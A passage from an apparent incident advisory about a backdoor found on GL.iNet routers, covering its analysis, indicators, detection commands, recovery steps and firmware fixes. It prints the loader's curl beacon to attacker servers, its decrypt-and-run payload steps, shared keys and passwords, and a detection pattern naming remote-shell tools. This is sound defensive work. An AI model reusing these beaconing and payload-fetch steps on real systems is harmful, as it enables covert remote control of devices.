- **It reports the router to a server,** in sixteen fields: a counter, its identifier, uptime,
  the number of open terminal sessions, its parent process, the serial number, byte order,
  processor type, every network interface's hardware address, the result of its last check-in,
  the device's hardware address and DDNS name, the model, the firmware type and version, and
  its own version, `v2.1`. It reads no VPN, Wi-Fi or password file.
- **How it talks to the server.**
  `curl -fsSkL --connect-timeout 10 -X POST -d "<hex>" "<server>/v1/gl/access"`, with certificate
  checking off (`-k`). The body is the report XORed with a repeating 32-byte key and written as
  upper-case hexadecimal; the reply is protected the same way. The key is the same in all 49
  copies (first published by rdizzie, [post 40](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/40)):
  `fe9d8e6705d3338031c2f3ab8d0cd0e7a929c8ab977d0e696dfe905e05f0f37b`.
- **What the servers answered,** from the loaders' memory. Either "nothing to do":
  `{"url":"","sleep":259200,"key":"","args":"","quit":false,"name":""}`, or a task: a download
  address `https://<server>/v1/gl/download?token=<16 characters>`, the name `ujaild` and the
  password `JHWmVqTwEryeXiAyXwEnCmKrQvRtnpxV`, the same for every router. A task reply was still
  in memory on 26 of the 47. No reply told a router to stop.
- **What it does with a task.** It downloads the file to `/tmp/ujaild`, decrypts it with
  `openssl enc -d -aes-256-cbc -pbkdf2 -salt` and that password, unzips it, links
  `/usr/sbin/ujaild` to it, ends any copy already running, starts it, waits one second and
  deletes both the link and the file. That is exactly the process we found: named
  `/usr/sbin/ujaild`, running from `/tmp/ujaild (deleted)`.
- **How often it checks in.** Every 259,200 seconds (three days): that is what the servers sent
  in every reply we recovered. 7,200 seconds (two hours) is the loader's own fallback when it
  gets no usable answer. Forum users saw one value each ([post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14), [post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22));
  both are right.
- **Two sets of servers.** The 33,722-byte loader (42 routers) uses `cdn.adguardns.com` and
  `cdn.adguardns.org`. The 35,745-byte loader (7 routers) uses `cdn.lede-openproject.org`,
  `cdn.adxinsight.com` and `cdn.openwrt-project.org` (first decoded by acs, [post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2)). It
  shuffles its list at every start and tries each in turn.
- **What it does not do.** It holds no code that writes the VPN server settings, the account
  files, the upgrade keep list or a scheduled task. Its only job is to report and to fetch.
- **When the servers were set up** (Reported by rdizzie, [post 18](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/18), and UnhappyCloud,
  [post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14), from public registration and certificate records): `lede-openproject.org`
  and `adxinsight.com` registered on 4 July 2025, eight minutes apart at two registrars;
  `openwrt-project.org` on 18 August 2025, with certificates for all three issued within eleven
  minutes the next morning; `adguardns.com` and `adguardns.org` on 8 December 2025, 25 minutes
  apart. *Added 24 November:* we checked these dates and the certificates in the public records ourselves, and
  `adsanalypro.com`, the name found only in our samples, was registered three seconds after
  `adxinsight.com` at the same registrar. Two of the names had belonged to someone else years before and were registered again
  after they lapsed. Our earliest file date is 15 September 2025 and our batches begin on
  7 December 2025. *Added 24 November:* by the files' modification time, which gives a date for
  all 49 routers, 30 of our 49 installs are in December 2025.
- **Not every router gets the second stage** (Reported). One owner found the loader running and
  no `ujaild` ([post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)). On ours it was running on all 49.
- **Models reported by others** beyond ours: GL-X2000 and GL-XE3000 ([post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2),
  [post 14](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/14)).

**The second stage.** Verified by us on 23 November 2026 by reading both builds and the memory
of 47 running copies; full page:
[docs/older-backdoor-second-stage.md](docs/older-backdoor-second-stage.md).

- `ujaild` is one self-contained program for 64-bit ARM, 6.8 MB, written in Go and hidden with
  the `garble` tool. Its file is deleted once it runs, so the only copy is the one in memory; we
  took ours from the running process on each router.
- Two builds over the 49 routers: SHA-256
  `311b5767e7d63e7dbdc1476c36608b8d7ef729c8bbcc64ded63b9470396351d6` on 42 and
  `53736d5db721a358bec5b9ddf6056df73b36fc5330300342c42f866a05191432` on 7, the same seven that
  have the larger loader.
- It takes four kinds of task from its server: run a program, write a file, write a file and
  run it, and forward traffic (a SOCKS5 proxy into the network behind the router). It can also
  be told to exit. acs first noticed the proxy library names in it ([post 2](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/2)).
- It holds no code of its own for VPN settings, passwords, SSH keys or the firewall. With "run
  a program" its operator does not need any.
- Its server addresses are stored encrypted in the file. Decrypted:
  `https://up.adguardns.com/v1/gl/instance` and `https://up.adguardns.org/v1/gl/instance` in
  the first build, `https://up.adsanalypro.com/v1/gl/instance` in the second. The last name had
  not been reported anywhere when we published it.
- In memory on the 47: check-in counters up to 366, server dates from 23 May 2026 to
  22 November 2026, and no task and no forwarding on any of them at the time of capture. Memory
  keeps only what the program still holds, so that is not proof that none was ever given.
- HubertCumberdale reports that only one of the scanners on VirusTotal flagged it
  ([post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22)).

**Its servers, all eight names.** `cdn.adguardns.com`, `cdn.adguardns.org`,
`cdn.lede-openproject.org`, `cdn.adxinsight.com`, `cdn.openwrt-project.org` (loader);
`up.adguardns.com`, `up.adguardns.org`, `up.adsanalypro.com` (second stage). The servers were
answering our routers until we removed the backdoor on 22 November 2026. The names imitate
AdGuard, OpenWrt and an advertising service; nothing we have links them to those. If your DNS
resolver keeps a query log, search it for these names.

**Why it stays out of sight.**

- Nothing it leaves on disk is an ordinary executable: one bytecode file with a daemon's name,
  and a copy of the firmware's own interpreter.
- Neither running process has a file behind it: the loader's script and the second stage's
  program are both deleted after start.
- Every process and file name is one a router could plausibly have.
- GL.iNet's published check does not look for any of it.

**How it survives, and what ends it.**

- A restart: it starts again, from `urandom_seed`.
- An upgrade with settings kept: its two keep-list lines carry `/bin/ulogd` and the changed
  start-up script into the new firmware. GL.iNet's fixed firmware puts the start-up script
  back, so it is no longer started that way, and leaves `/bin/ulogd` on the router (see
  [Fixed firmware](#fixed-firmware)). *Updated 25 November:* that describes the firmware of 22 and
  23 November. The builds of 24 November also delete `/bin/ulogd` and restore the keep list.
- By hand, as we did on the 49 after saving the evidence: end the `monitord` and `ujaild`
  processes, put `/etc/init.d/urandom_seed` and `/lib/upgrade/keep.d/netifd` back from the
  copies under `/rom`, delete `/bin/ulogd` and `/usr/bin/monitord`. That stops it. It is not a
  recovery: whoever ran it had root on the router for months.
- The recovery is the reinstall in [If you find something](#if-you-find-something).

**The VPN server settings file.** On 27 of our 30 routers with a dated install,
`/etc/config/wireguard_server` was changed 9 to 12 seconds after the backdoor's files were
written. (*Note, 25 November:* that count is from the morning of 22 November, over the 30 backdoored
routers checked by then that gave a dated install, not over all 49.)
Three forum users report the file changed at or right after the install on their own
routers ([post 19](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/19), [post 21](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/21), [post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22)). One of
them keeps weekly backups of the router's files and reports that the file was rewritten 11
seconds after the install **with its content unchanged**, and that `/etc/passwd` and
`/etc/shadow` were unchanged throughout ([post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22), [post 23](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/23)). Another saw the backup copies of the
account files (`/etc/passwd-`, `/etc/shadow-`) written about an hour after the install
([post 19](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/19)). So the rewrite looks like a step of an automated installer, and in the one case
where a before-and-after exists nothing in the file changed. We saved only the change time on
ours, so we cannot confirm it. *Corrected 23 November: this page said the file was left "as
the intruder left it"; the one documented comparison shows no change.* We still treat the VPN
keys on such a router as read.

**Are the file dates real?** Our install dates are the routers' own file times. One owner's
weekly backups show the files absent in one backup and present in the next, matching the file
times ([post 31](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/31)). Admon notes that the attacker in this incident sets file times to blend in
([post 26](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/26)). The KVM implant's installer has an option that does exactly that
([docs/gl-helper-implant.md](docs/gl-helper-implant.md)); nothing in this backdoor's loader or
second stage does. Treat the dates as probably right, not proven.

**What we do not know.** How it was installed (see the technical breakdown for the batches and
dates). What rewrites the VPN server settings file at install time: neither the loader nor the
second stage holds code for it.

**One more warning from an owner.** After reinstalling, an online upgrade to 4.11.0 with
settings kept switched the cloud client, AstroWarp and GoodCloud's remote SSH and web access
back on, although they had been turned off ([post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22)). Reported; we have not tested it. Check
those settings after any upgrade.

## Check a device

Three ways: the community script, by hand, or GL.iNet's own checks. The first two follow the
table in [The signs, and what each one means](#the-signs-and-what-each-one-means). GL.iNet's
checks look for one sign only and are listed last.

### In your GoodCloud account

*Added 24 November 2026.* If the device is or was bound to GoodCloud, the account's own log shows
whether it answered the attacker. No SSH is needed, and it works after the device has been reset.

1. Sign in at <https://www.goodcloud.xyz/>, open **Logs**, then **Device Logs**.
2. Set the range to 19 November 2026 08:00 to 21 November 2026 09:00 UTC (the page shows your
   local time) and enter the device's MAC.
3. Open **Details** on the rows and look for a message with **`"id":1`**, the number, such as
   `{"id":1,"astrowarp":[],"code":0,"time":...}`. Ordinary messages have a long quoted `id`.

A match means the attacker's command ran on that device. No match is not proof of anything. What
the log holds, what ours shows and the limits are in
[docs/goodcloud-device-log.md](docs/goodcloud-device-log.md).

### With the script

The most complete check is the community triage script by Admon. It looks for every sign in that
table that can be seen on the device itself, which is all of them except the cloud log entry. It
saves evidence before it changes anything, and is being updated as findings come in:

- Step-by-step guide: <https://gl-i.net/security/csa-2026-01/fix/>
- Script and documentation: <https://github.com/admonstrator/glinet-csa-2026-01>

Read a script before you run it as root. To keep it off the device's storage, pipe it over SSH from
a copy you have read, as that repository's README shows.

It also looks for things that are not in our table because we have not found them on a router:
the files of the "gl-helper" implant reported on KVMs, a replaced `netstat`, and an SSH key or
remote-terminal setting added by an attacker. Its `--fix` does not remove the older backdoor.

### By hand, over SSH on a router

One check per sign, in the order of the table. Run them before you restart the router. The first
command is ours and covers three signs at once; GL.iNet's own command for its indicator is
`ps | grep tmp`, listed under [GL.iNet's own checks](#glinets-own-checks).

| Sign | Command | A hit looks like |
|---|---|---|
| Remote shell, older backdoor processes, GL.iNet's indicator | `ps w \| grep -E 'crond -i\|mkfifo\|nc [0-9]\|sh -i\|monitord\|ujaild' \| grep -v grep` | `nc` with an address, `/bin/sh -i` or `mkfifo`: the remote shell. `monitord` or `ujaild`: the older backdoor. `crond -i /tmp/.log`: GL.iNet's indicator |
| Shell pipe | `ls -la /tmp/f /tmp/.log` | `/tmp/f` listed with a line that starts with `p` |
| Firewall rule | `iptables -t nat -S SDWAN_IP_MAPPING` and, on firmware that answers "use 'nft' tool", `nft list ruleset \| grep -i sdwan` | A rule with `127.0.0.1` on both sides |
| State file | `ls -la /etc/mp_ip_mapping_info` and `uci -q get mptun.global.enable` | The file exists, has size 0 and a date of 20 November 2026 or later (shown in the router's own time zone), and the second command prints `0` or nothing (AstroWarp is not in use). *Added 27 November 2026:* a file dated 19 November counts too. If you find this file, the attacker ran a command on the router with full rights, and on some routers that command opened a remote shell. After a restart nothing shows which it was, so treat the router as fully compromised |
| Older backdoor, start-up script | `/rom/bin/busybox cmp /etc/init.d/urandom_seed /rom/etc/init.d/urandom_seed` | Any output. Nothing printed means the file is the firmware's own |
| Older backdoor, added file | `ls -l /bin/ulogd` | The file exists |
| Older backdoor, keep list | `/rom/bin/busybox cmp /lib/upgrade/keep.d/netifd /rom/lib/upgrade/keep.d/netifd` | Any output. No output does not clear the router: we found the backdoor without this change on some |
| Cloud log entry | Not on the router: export the device log from your GoodCloud account | See below |

Before you use `netstat` on a suspect router, look at it first: GL.iNet staff warn that it may
have been replaced on an infected device and that running the replacement starts the malware.
On a router it should be a link to `busybox`:

```
ls -l /bin/netstat
```

No hit only tells you nothing is running now and nothing of this kind has run since the last
boot; the state file and the older backdoor are the two signs that outlast a restart. It cannot
tell you a device was never compromised.

**The older backdoor** was first reported by several owners in
[this forum topic](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097),
on GL-AX1800, GL-X2000 and GL-MT3000 routers. Verified by us on 22 November:
we found it running on 49 routers we manage
  (GL-MT2500, GL-MT3000, GL-MT6000, GL-AX1800 and GL-AXT1800;
  firmware 4.7.0 to 4.11.0), with file dates from September 2025 to May 2026. An earlier
version of this page said we had not seen an affected device. GL.iNet's check does not find it:
the process it looks for was not running on any of the 49. The remedy is the reinstall in
[If you find something](#if-you-find-something).

**The cloud log entry** (Reported by three owners, finding R-31; we have not exported such a
log ourselves. *Updated 25 November:* on 24 November we read these entries on the Device Logs
page of our own account; see [In your GoodCloud account](#in-your-goodcloud-account) above).
The first report: in their GoodCloud
account, the exported device log for a GL-AXT1800 on 4.8.3 that never used AstroWarp held three
command responses on 20 November, between 20:46 and 21:31 UTC, of the form
`{"id":1,"astrowarp":[],"code":0}`. Ordinary commands in that log carry a 32-character id and a
matching `publish` entry; these had the number `1` and no matching entry. It is the one place
that still shows the command after the router has been restarted or reinstalled. If you look,
export the log before you change anything on the account: the same owner lost it after
resetting the account password.

### GL.iNet's own checks

These are the checks in the forum copy of GL.iNet's
[security notice](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056)
as it stood on 23 November 2026. *Update, 23 November: GL.iNet's site notice has since dropped
the two router checks and calls the KVM check one of "limited coverage"; the forum copy still
had all four when we last looked. They are kept here because owners were told to run them.* All four look for the same thing: the exact text
`crond -i /tmp/.log` in the details of a running process. A line that shows only the `grep`
command is not a match.

| Device | Where | Check |
|---|---|---|
| Router, web interface | Admin Panel: **System → Advanced Settings**, sign in to LuCI, then **Status → Processes** | Search the page (Ctrl+F) for `tmp/.log` |
| Router, SSH | SSH session | `ps \| grep tmp` |
| KVM, RMQ1 | KVM web interface: **Toolbox → Terminal → Access** | `ps -a \| grep tmp` |
| KVM, all other models | The same terminal | `ps -aux \| grep tmp` |

Run the KVM commands in the KVM's own terminal, not on the computer connected to it. If a KVM
is infected, the notice also says to check that computer: unfamiliar programs, browser
extensions or user accounts, unexpected start-up items or scheduled tasks, unusual settings
changes or network activity, and a full scan with up-to-date security software.

What we can say about these checks:

- **On routers, not known to us.** That process was not running on any router we checked,
  including every router where we found one of the other signs.
- **On KVMs, not known to us either.** We have not examined an infected KVM. It is reported to
  be the name the KVM installer gives its own process (findings K-9).
- **The web-interface check does not work on some models.** GL.iNet staff confirm that on
  Qualcomm-based models such as the GL-BE9300 the LuCI "Status → Processes" page is empty, and
  point to SSH instead
  ([forum post](https://forum.gl-inet.com/t/be9300-luci-no-info-in-status-processes/73166/4)).
- A result without a match says nothing about the other signs in the table above. The notice
  itself now says its quick checks "may not detect every affected device".

For KVM firmware see [docs/kvm-firmware.md](docs/kvm-firmware.md).

## If you find something

> **Start with the community check.** Admon's triage script and its step-by-step guide are the
> first layer: they check a router or KVM for the known signs, save the evidence, and can remove
> the known traces of the 20 November malware.
> Guide: <https://gl-i.net/security/csa-2026-01/fix/> ·
> Script: <https://github.com/admonstrator/glinet-csa-2026-01>
>
> Run it **before** you restart, reset or update the device; some traces last only until the next
> restart. It does not replace the steps below: its `--fix` does not remove the older backdoor,
> and no clean-up takes back a key that was copied.

**A compromised router is not the only thing that is compromised. Everything it held a key for is
too.** The attacker had a root shell, so every key, password and profile stored on the device
could be copied. Cleaning or reinstalling the router does not take those back. You have to remove
that access at the other end.

1. Save the output and note the time. In a business network, talk to whoever handles incidents or
   insurance for you before changing anything.
   - **Take the evidence archive while the device is still running, before any restart.** The
     triage script's `--archive` records what exists only in memory and is gone after a reboot:
     the process list, the details and the program file of each suspect process (even one
     whose file was deleted), open connections, the firewall rules in force and the system log.
     It does not copy all of `/tmp` or the memory of running programs. By default it writes
     the archive to `/tmp`, which is memory too, so copy it off the device before you restart,
     or stream it to your computer with `--archive --stdout`.
   - **If it is a KVM that was attached to a work computer, think carefully before you wipe it
     and install new firmware.** If someone used it to reach that computer and went on into
     your employer's systems, the compromised KVM may be the only evidence you have that it was
     not you personally. Save the evidence archive first (the triage script's `--archive`), keep
     a copy off the device, and consider setting the unit aside untouched.
2. Stop the processes or disconnect the device from the internet.
3. **Revoke every VPN client profile the router held, on the server side.** Deleting the profile
   from the router is not enough: a copy of it still works from anywhere.
   - WireGuard and AmneziaWG: remove that peer on the server, or give the server new keys. Then
     create a new profile with a new key pair for the router.
   - OpenVPN: revoke the client certificate on the server, or change the username and password
     if the profile used them.
   - Commercial VPN services: sign in to the provider and regenerate the keys or change the
     password. A copied profile is a login to your account.
   - ZeroTier, Tailscale and similar: remove the router's node from the network in the controller
     or admin console, then join again as a new node after the router is reinstalled.
4. **If the router was itself a VPN server,** its private key was readable too. Give it a new key
   and issue new profiles to every client.
5. **Revoke SSH keys the router used to log in elsewhere.** If the router held an SSH private key
   (by default `/root/.ssh/id_dropbear`; also any `id_rsa`, `id_ed25519` or similar under
   `/root/.ssh`), every machine that trusts it must have the matching public key removed from its
   `authorized_keys`. Check the router's own `authorized_keys` as well for keys you did not add.
6. Replace the rest of what it stored: Wi-Fi passwords, the admin password, DDNS and cloud
   credentials.
7. **Reinstall the firmware with "Keep Settings" switched off, from an image you downloaded
   yourself** (see [Firmware downloads](#firmware-downloads)), then set the device up again from
   known-good information and the new keys.

   **Measured, 26 November 2026.** We placed harmless markers on a GL-MT3000 of our own, at the
   names and start routes seen in this incident and at others, and ran each method once (the
   factory reset twice, on two firmware versions):

   | Method | What was left afterwards |
   |---|---|
   | Upgrade to the fixed firmware, settings kept | The markers the firmware's clean-up names were removed. Everything else was carried over and ran on the new firmware: start-up, schedule, DHCP and firewall hooks, an added SSH key, an account, an extra VPN server peer |
   | Factory reset (web interface) | Everything visible was removed. Every hidden folder stayed, with its files. On firmware without the clean-up that included folders at the three paths the implant uses |
   | Install the firmware again, "Keep Settings" off | Nothing of ours was left, hidden folders included |

   So for a router that showed any sign, **a reinstall with "Keep Settings" off is the only one
   of the three that we can say starts clean.** A factory reset is not a substitute for it, and
   neither is an upgrade that keeps settings, on fixed firmware or not. None of the three changed
   the boot loader, its settings or the partition with the device's own data: their checksums
   were the same before and after every run. Limits: one unit of one model, markers and not real
   samples, upgrades run by the command-line tool. **Every marker, where it was placed and what
   happened to it under each method, is in [docs/cleanup-test.md](docs/cleanup-test.md).**

   - **Do not upgrade a suspect router with settings kept.** The firmware's own keep list carries
     `/etc/rc.local`, the root crontab, everything under `/etc/config`, `/etc/openvpn` and
     `/etc/udhcpc.user.d` into the new installation, and the router runs every script in that
     last directory on each DHCP event (read in the GL-AXT1800 4.6.11 and GL-MT3600BE 4.9.0
     images). Forum users report a backdoor that survived upgrades with settings kept. We have
     since found that backdoor on routers we manage, with its own line added to the keep list
     (*corrected 22 November: this page said we had not seen such a device*). We also
     tested it: on a GL-MT3000, start-up entries placed in kept settings survived an upgrade to
     the fixed firmware and ran on it (see [Fixed firmware](#fixed-firmware)).
   - **Do it in one step, not two.** A reinstall with settings off replaces the firmware image
     and the writable layer at the same moment. Any sequence that renews them one after the
     other (a factory reset and then an upgrade with settings kept, or the other way round)
     leaves one of the two as it was while the other is renewed, so whatever is in the old half
     gets a first boot in which it can write into the new half. We have not seen a changed
     firmware image on a router. That is not much comfort: our checks find what we already know
     to look for, and someone careful would not have left that.
   - **A factory reset alone is not a recovery.** Use it only as a stop-gap when you cannot
     reinstall yet. It erases the writable layer, where everything we and the forum reports have
     found lives, but leaves the installed firmware image as it is. *Corrected 27 November 2026:*
     it does not erase all of the writable layer. In our test it removed what is visible there
     and kept every hidden folder with its files (R-45). On a
     GL-AXT1800 (4.8.4) the flash partition that holds that image is writable from a root shell
     and the tools a firmware update uses are on the router, so an attacker with root was not
     prevented from changing the image (read from the device; we did not attempt a write, and we
     know of no report that it was done). A reinstall writes the image again and, with settings
     off, starts with an empty writable layer (read in the upgrade scripts of the GL-MT3600BE
     4.9.0 image; other models not checked, and on a model with two firmware slots the other
     slot is not rewritten).
   - **What a reinstall does not replace.** It is the most complete step an owner has; it is
     not a guarantee. On a GL-MT3000 (4.11.1) the upgrade rewrites only the firmware image and
     the writable layer. The boot loader and the partition that holds the device's own data
     (serial number, hardware address, DDNS id, country code) are left as they were, by a reset
     and by a reinstall alike (read in that firmware's upgrade scripts and partition table; we
     have not compared them before and after an upgrade). *Added 27 November 2026:* we have now.
     On a GL-MT3000 their checksums were the same before and after an upgrade with settings, a
     factory reset and an upgrade without settings (R-46).
   - **The boot loader.** We found no step in a reset or a reinstall that rewrites it (read in
     the GL-AXT1800 and GL-MT3600BE firmware). On the GL-AXT1800 that had the remote shell
     (firmware 4.8.3) the kernel marks the boot loader partition writable and let us open it
     for writing; we wrote nothing. We compared that router's boot loader with the binaries
     GL.iNet publishes for the model in its
     [uboot-ipq60xx](https://github.com/gl-inet/uboot-ipq60xx) repository: it is byte for byte
     the one published on 1 December 2021. That is one router; we know of no report of a
     changed boot loader. *Corrected 22 November: this page said the kernel marked the boot
     loader not writable on both routers we read. That was true of one of them.*
   - **KVMs.** The same applies. An upgrade with "Save current configuration" ticked carried a
     boot script and an added SSH key into 1.10.3 on our test RM1. Untick it. By our reading of
     the 1.10.2 upgrade code nothing is then copied across; we have not run that case. See
     [docs/kvm-firmware.md](docs/kvm-firmware.md).
8. Check the computers behind the device. For a KVM, check the computer it was attached to.

## Fixed firmware

> **Update, 28 November 2026: 4.11.3 for the GL-MT3000 and GL-MT6000.** GL.iNet released 4.11.3
> for both models on 27 November; our mirror held it by 13:27 UTC that day. Its release note lists
> two fixes, for Mesh logs that could fill `/tmp` and for opening the AdGuard Home settings page
> over HTTPS, and nothing about security. GL.iNet's
> [security advisories page](docs/gl-statements.md#the-security-advisories-page) gives 4.11.3 as
> the resolved version for both models; its notice still gives 4.11.2. **We have not read 4.11.3.**
> Everything below about 4.11.2 and its clean-up is about 4.11.2 only.

> **Update, 27 November 2026: the fix closes the hole that was used. It does not put a lock on
> the router.**
>
> A router with GoodCloud switched on listens for commands from GL.iNet's cloud. Before the fix
> and after it, the router carries out a command that arrives on that channel without checking
> who sent it: there is no signature on a command, and no check that the router is linked to an
> account. What keeps an outsider from sending commands is GL.iNet's servers refusing to pass
> them on. That is the part that failed on 20 November, and GL.iNet says it has corrected it on
> its side.
>
> What we read: on the GL-MT3000, the part of the cloud program that receives a command and hands
> it on is the same in 4.11.0 (before the fix) and in 4.11.2 (after it). Of its 38 command
> modules, 34 are unchanged; the fix is inside the one command the attack abused.
>
> So the channel can still do everything else it could do before, for anyone who is able to send
> on it. In 4.11.2 that includes calling any function of the router's own management interface,
> starting a firmware upgrade from an address given in the message, and replacing the router's
> list of firewall rules with rules that let traffic in from the internet side.
>
> **What this means for you.** If you do not need GoodCloud, switch it off: that takes the router
> off this channel. If you need it, your router's safety on this channel rests on GL.iNet's
> servers. Limits: one model, and a reading of the compiled program, not a test. Details:
> [docs/open-weaknesses.md](docs/open-weaknesses.md) and finding R-47.

> **Update, 25 November 2026: a second round of firmware, and its clean-up now covers the older
> backdoor.** GL.iNet released new stable builds on 24 November for the same eighteen models:
> GL-MG1300, GL-MT3000 and GL-MT6000 (4.11.2), GL-E5800 (4.10.4), GL-BE3600 and GL-BE9300
> (4.10.3), GL-BE14000 (4.9.4), GL-BE6500, GL-MT3600BE and GL-MT5000 (4.9.2), GL-BE10000 (4.8.8),
> GL-AX1800, GL-AXT1800, GL-SFT1200, GL-X3000 and GL-XE3000 (4.8.5), GL-MT2500 and GL-X2000
> (4.7.15). Builds dated 23 and 24 November are also listed for fourteen older models (4.3.31 and
> 4.5.24), which we have not opened. That is the list as our mirror held it at 01:24 UTC on
> 25 November.
>
> We unpacked two of the new builds, GL-MT3000 4.11.2 and GL-AXT1800 4.8.5, and read the clean-up
> script in each. It is the same file in both, and it is a new one: 76 lines where the first had
> 46 (package `gl-sdk4-system-check`, build git-2026.327; SHA-256 beginning `7fb65a4cb42c15c6`).
> What it adds:
>
> - **It now removes the older backdoor.** It stops the `monitord` and `ujaild` processes, puts
>   `/etc/init.d/urandom_seed` and `/lib/upgrade/keep.d/netifd` back from the firmware's own
>   copies, and deletes `/bin/ulogd`, `/usr/bin/monitord`, `/usr/sbin/ujaild` and the copy under
>   `/var/run`. The first round restored the start-up file only and left `/bin/ulogd` in place.
> - **It removes the KVM-style implant's folders whether or not the first one exists,** adds
>   `/etc/gl_nas/.cache` to them, and removes a third scheduled-task line.
>   *Corrected 25 November: there is no third scheduled-task line. Both scripts name the same
>   three. The new one removes them, and the `rc.local` line, whether or not `/etc/config/.gl`
>   exists. The folders it removes are `/etc/config/.gl`, `/etc/glinet/.cache` and
>   `/etc/gl_nas/.cache`; the first script removed only the first of these.*
>
> What has not changed, as far as the script shows:
>
> - **It is still a list of known names.** It does not look at anything else in the settings an
>   upgrade keeps: other lines in `rc.local`, other scheduled tasks, scripts in
>   `/etc/udhcpc.user.d`, added SSH keys or accounts, or `/etc/config/wireguard_server`.
> - **It cannot take back what was read.** Everything below about replacing keys and passwords,
>   and about not keeping settings on a device that was hit, stands.
>
> **Not tested on a device.** This is from reading the script in the two images. We have not
> repeated the upgrade test below on the new build, and we have not compared the rest of the
> firmware. In the GL-MT3000 build the cloud client's package is the same build as in 4.11.1.
>
> **Everything from here to the end of this section describes the first round,** the builds of
> 22 and 23 November, and is kept as it was written. Where it says the firmware leaves
> `/bin/ulogd` or does not look for the older backdoor's files, that is true of those builds and
> no longer true of the builds of 24 November.

GL.iNet's listing holds stable firmware dated 22 and 23 November 2026 for eighteen router
models: GL-MG1300, GL-MT3000 and GL-MT6000 (4.11.1), GL-E5800 (4.10.3), GL-BE3600 and GL-BE9300
(4.10.2), GL-BE14000 (4.9.3), GL-BE6500, GL-MT3600BE and GL-MT5000 (4.9.1), GL-BE10000 (4.8.7),
GL-AX1800, GL-AXT1800, GL-SFT1200, GL-X3000 and GL-XE3000 (4.8.4), GL-MT2500 and GL-X2000
(4.7.14); and for all seven KVM models (1.10.3, or 1.8.7 for the RMQ1). That is the list as our
mirror held it at 01:18 UTC on 23 November.

All of these builds are on our firmware mirror, <https://gl-fw.remotetohome.io/>, next to the
builds they replace. Each file's checksum is verified against the one GL.iNet publishes. Use it
to get a fixed build, or to compare a fixed build with the one before, as we did.

What we have read ourselves is the GL-MT3000 build, compared with the one before it:

- **The fix is in the handler we identified.** The cloud client's AstroWarp module is the file
  that changed in substance. For the command the attack used, `virtual_ip_info`, the handler
  now checks its two address fields as IPv4 addresses and its third field as a hardware address
  before it builds any command, and returns without acting when the check fails or the checker
  is missing. At least two other commands got the same treatment. GL.iNet has not said in words
  that this was the entry point; its fix says so. We have not sent the attack message to a
  fixed router to watch it being refused.
- **The firmware cleans up only part of what we have found.** A new script runs once at the
  first start after the update. It restores `/etc/init.d/urandom_seed` from the firmware's own
  copy, which is the start-up file the older backdoor changes. It does not remove that
  backdoor's added files or its keep-list line. It removes the entries of the KVM-style implant
  only if one particular folder exists. We have not tested what still runs afterwards.
- **That script is the whole clean-up, and it is the same in every build we could open.** On
  23 November we unpacked the fixed build of seventeen of the eighteen models (not the
  GL-E5800, whose file format we could not open). Each carries that one script, byte for byte
  the same, and no other file in any of them mentions the names of the older backdoor's files
  or of its servers. Nothing in the firmware looks for `/bin/ulogd`, for added SSH keys, or
  for anything else in the settings an upgrade keeps.
- **What an upgrade keeps has not been narrowed.** Read in the GL-MT3000 4.11.1 image, the
  keep list still carries all of `/etc/config`, the cron tables, `/etc/rc.local`, the SSH
  server's authorised keys, the account and password files and the scripts in
  `/etc/udhcpc.user.d`. A root-level intruder could have written to any of those.
- **So "removes the malware, keep your settings" holds only for the known start-up routes.
  We tested it.** On 23 November we put harmless stand-ins for each known way of starting at
  boot on a test GL-MT3000 (files of our own that only write a log line when they run),
  confirmed that every one ran after a restart on 4.11.0, then upgraded to 4.11.1 with settings
  kept:

  | Planted before the upgrade | After the upgrade | Ran on 4.11.1 |
  |---|---|---|
  | The changed start-up file of the older backdoor | Put back to the firmware's own | No |
  | `/bin/ulogd`, with the backdoor's own line in the upgrade keep list | Still there. The keep-list line is what carries it: a file put in `/bin` without that line is dropped by any upgrade | No |
  | The KVM-style implant's folder in `/etc/config`, its `rc.local` line and its three cron lines | Removed | No |
  | An added SSH key, and an added account | Still there | (these do not run) |
  | A different line in `rc.local` | Still there | Yes |
  | A different cron line | Still there | Yes |
  | A script in `/etc/udhcpc.user.d` | Still there | Yes |

  The clean-up does what its script says: the start-up routes it names are removed before they
  run. Everything it does not name is carried over with the settings, and what can run does
  run on the fixed firmware. An intruder with root access was not limited to the routes that
  have been found so far. One router, one model, upgraded with the router's command-line tool;
  the stand-ins copy the file names and start-up routes, not the real programs.
- **One weakness is not addressed in that build.** It concerns the cloud client and is separate
  from the handler. The component involved is byte for byte the same as before. We reported
  it to GL.iNet on 22 November 2026 and will not describe it here until it is fixed.
- **The VPN server settings were changed on most routers with the older backdoor, and an
  upgrade keeps them.** On 27 of the 30 such routers with a dated install,
  `/etc/config/wireguard_server` was changed 9 to 12 seconds after the backdoor's files were
  written (counted on 22 November over the 30 checked by then, not over all 49). We had saved only the time of the change, so we do not know what was changed. That
  file is in `/etc/config`, which an upgrade with settings kept carries over whole, and the
